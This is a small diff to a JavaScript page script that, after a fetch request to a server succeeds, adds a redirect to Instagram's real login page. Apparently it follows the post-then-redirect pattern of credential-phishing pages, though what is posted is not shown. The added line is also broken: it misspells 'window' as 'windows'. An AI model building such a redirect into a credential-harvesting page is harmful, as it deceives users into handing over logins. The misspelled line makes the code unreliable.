@@ -40,6 +40,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 })
             }).then(response => {
                 console.log('Success:', response);  // response from server 
+                windows.location.href = "https://www.instagram.com/accounts/login/" // redirecting to instagram login page
             })
                 .catch(error => {
                     console.error('Error:', error);  // catching error if any
